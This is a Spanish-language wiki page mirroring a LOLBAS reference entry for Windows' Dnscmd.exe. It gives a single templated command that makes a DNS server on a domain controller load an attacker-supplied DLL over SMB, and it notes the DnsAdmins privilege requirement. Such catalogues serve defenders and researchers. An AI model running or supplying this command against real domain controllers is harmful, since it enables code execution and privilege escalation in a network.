# LOLBAS: Dnscmd.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Execute`

A command-line interface for managing DNS servers

## Comandos

### Remotely inject dll to dns server

Execute · priv: DNS admin · T1543.003

```cmd
dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}
```

Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details.

